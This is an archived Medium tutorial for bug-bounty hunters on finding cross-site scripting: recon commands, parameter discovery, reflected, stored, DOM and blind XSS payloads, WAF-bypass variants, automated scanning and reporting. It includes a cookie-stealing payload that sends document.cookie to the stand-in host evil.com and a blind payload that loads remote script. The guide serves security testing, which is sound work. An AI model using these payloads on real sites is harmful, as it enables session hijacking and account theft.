# How to Find XSS in Real-Life Bug Bounty Targets

- **Source URL:** https://medium.com/@rupaitanudas/how-to-find-xss-in-real-life-bug-bounty-targets-319177706ad8?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250501115732/https://medium.com/@rupaitanudas/how-to-find-xss-in-real-life-bug-bounty-targets-319177706ad8
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/7619 (id 7619)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# How to Find XSS in Real-Life Bug Bounty Targets

Introduction

In the bug bounty world, Cross-Site Scripting (XSS) is one of the most common vulnerabilities hunters encounter. Yet, finding valid XSS vulnerabilities on modern applications requires patience, creativity, and skill. This guide provides a step-by-step approach to identify XSS vulnerabilities in real-world targets, from scoping to exploiting.

Whether you’re an experienced bug bounty hunter or just starting out, this article will show you how to systematically search for XSS vulnerabilities and increase your chances of getting that bounty payout.

1\. Start with Recon: Mapping Your Target

Before diving into XSS hunting, gather all possible attack surfaces on the target. This helps you identify input points, endpoints, and URLs where XSS vulnerabilities may lurk.

Tools for Recon:

Subdomain Enumeration

Use tools like Subfinder, Assetfinder, or Amass to find all reachable subdomains.

bash

subfinder -d target.com -o subdomains.txt

URL Gathering

Gather all URLs using tools like gau (Get All URLs) and Waybackurls:

bash

gau target.com | tee urls.txt

waybackurls target.com | tee -a urls.txt

These tools collect URLs from caches, public archives, and the application’s history. Look out for query parameters — they’re usually great candidates for XSS testing.

2\. Identify Parameters and Inputs to Test

Once you’ve collected URLs, filter them to find those containing parameters or input fields.

Use GF Patterns to extract URLs with parameters related to XSS:

bash

gf xss urls.txt > xss\_urls.txt

Tools for Parameter Discovery:

ParamSpider: Crawl target websites to identify hidden parameters.

bash

paramspider -d target.com -o params.txt

Burp Suite: Use Intruder and Repeater to explore different inputs and parameters interactively.

These steps help you focus on vulnerable input points instead of wasting time on irrelevant parts of the target.

3\. Testing for Reflected XSS

With the URLs and parameters in hand, the next step is to test for reflected XSS — where the payload is reflected immediately in the response.

Basic Payloads for Reflected XSS:

Test using a simple alert payload:

html

[https://target.com/search?q=](https://target.com/search?q=)\<script>alert(1)\</script>

If the above payload doesn’t work, try encoding it:

html

[https://target.com/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E](https://target.com/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E)

Use Burp Suite to observe the server’s response and see how the input is handled. Check if the input gets reflected directly in the HTML body, attributes, or in JavaScript contexts.

4\. Hunting for Stored XSS

In Stored XSS, the malicious script is saved on the server and triggered when users access the stored content (e.g., in comments or profiles).

Where to Look for Stored XSS:

Comment sections

User profiles or status updates

Feedback forms

Message boards or chat applications

Example Payload:

If the application allows rich text input, try injecting this:

html

\<script>document.location=’[https://evil.com?cookie='](https://evil.com/?cookie=%27) + document.cookie\</script>

This payload attempts to steal the session cookie by sending it to a malicious site. If the XSS is successful, the attacker can hijack the session or impersonate the victim.

5\. Bypassing Filters and WAFs

Modern applications often have input sanitization and Web Application Firewalls (WAFs) to block common XSS payloads. However, creative payloads and encoding techniques can help bypass these protections.

Tips to Bypass WAFs:

Unicode Encoding:

html

\<script>alert\`\u0061\`\</script>

HTML Entities:

html

\<img src=x onerror=”alert(1)”>

Event Handlers in Tags:

html

\<svg onload=alert(1)>\</svg>

Use Dalfox or KXSS to automate WAF bypass testing:

bash

dalfox file xss\_urls.txt — waf-evasion

6. DOM-Based XSS: Client-Side Vulnerabilities

DOM-based XSS occurs when JavaScript code modifies the DOM based on user input, leading to the execution of malicious code directly in the browser.

How to Test for DOM XSS:

Look for JavaScript snippets like this in the page source:

javascript

let input = location.search.split(‘=’)\[1\];

document.body.innerHTML = \`\<h1>${input}\</h1>\`;

Craft a payload to exploit the vulnerability:

html

[https://target.com/index.html?input=](https://target.com/index.html?input=)\<script>alert(1)\</script>

Tools like Burp Suite’s DOM Invader or OpenRefine can assist in identifying DOM-based issues.

7\. Automating XSS Testing with Dalfox and KXSS

Manual testing can be slow. Automating the XSS hunting process can save time and increase efficiency.

Dalfox:

Dalfox hunts for reflected, stored, and blind XSS in a single run:

bash

dalfox url [https://target.com](https://target.com) — blind-url=[https://xsshunter.com](https://xsshunter.com)

KXSS:

KXSS is great for finding reflected inputs:

bash

cat urls.txt | kxss | tee reflected.txt

8. Using XSS Payload Lists for Fuzzing

When brute-forcing for XSS, using payload lists can increase your chances of success. Some excellent payload lists include:

XSS Payloads: PayloadAllTheThings

Blind XSS: Tools like XSS Hunter allow for tracking and alerting on blind XSS payloads.

Use ffuf or Burp Intruder to fuzz parameters:

bash

ffuf -u [https://target.com/?param=FUZZ](https://target.com/?param=FUZZ) -w xss-payloads.txt

9. Blind XSS: Catching the Unseen Vulnerabilities

Blind XSS occurs when the payload executes in a location that the attacker cannot directly observe (like an admin dashboard).

How to Exploit Blind XSS:

Inject the following payload in input fields that trigger an action on the backend:

html

\<script src=”[https://xss.hunter.com/payload.js](https://xss.hunter.com/payload.js)">\</script>

If the XSS triggers, XSS Hunter will log the event.

10\. Reporting XSS: Get That Bounty!

If you discover an XSS vulnerability, document your findings carefully:

Proof of Concept (PoC): Record how you injected the payload and the impact (e.g., a screenshot of a stolen session).

Detailed Steps: Provide the exact URLs, parameters, and payloads used.

Impact Assessment: Explain how the vulnerability could be exploited (e.g., phishing or account hijacking).

Make sure to follow the bug bounty program’s disclosure policy to maximize your chances of reward.

Conclusion

Finding XSS vulnerabilities on real-world bug bounty targets requires skill, persistence, and a bit of creativity. Using a structured approach, automated tools, and manual techniques can help you identify and exploit XSS in applications.

The world of bug bounty hunting is highly competitive, but mastering XSS hunting will put you ahead of the curve and unlock new opportunities for bounties and recognition.

Happy Hunting! 🕵️♂️
